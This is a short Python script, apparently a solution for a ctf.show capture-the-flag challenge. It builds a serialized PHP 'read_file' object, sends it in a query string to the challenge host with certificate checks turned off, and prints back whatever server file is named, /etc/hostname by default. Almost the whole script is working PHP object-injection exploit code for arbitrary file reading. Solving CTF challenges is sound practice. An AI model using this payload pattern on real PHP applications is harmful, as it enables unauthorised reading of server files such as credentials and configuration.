"""PHP object injection reader for 8c26f6b1 CTF challenge."""
import html
import re
import ssl
import sys
import urllib.parse
import urllib.request
import urllib3

urllib3.disable_warnings()

BASE = "https://8c26f6b1-6c7a-40c5-86ca-605b5c7c2819.challenge.ctf.show/"


def exploit(filename: str) -> str:
    # read_file object: start=gxngxngxn (triggers destruct), filename=<target>
    payload = (
        'O:9:"read_file":2:'
        '{s:5:"start";s:9:"gxngxngxn";'
        's:8:"filename";s:%d:"%s";}'
    ) % (len(filename), filename)
    qs = urllib.parse.urlencode({"start": "gxngxngxn", "read": payload})
    req = urllib.request.Request(
        BASE + "?" + qs,
        headers={"User-Agent": "Mozilla/5.0"},
    )
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        resp = urllib.request.urlopen(req, timeout=25, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
        text = html.unescape(re.sub(r"<[^>]+>", "", body))
        # strip the source dump header, keep tail (file content printed after source)
        return text
    except Exception as e:
        return f"ERR: {type(e).__name__} {str(e)[:200]}"


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
    print(f"=== READ {path} ===")
    print(exploit(path))
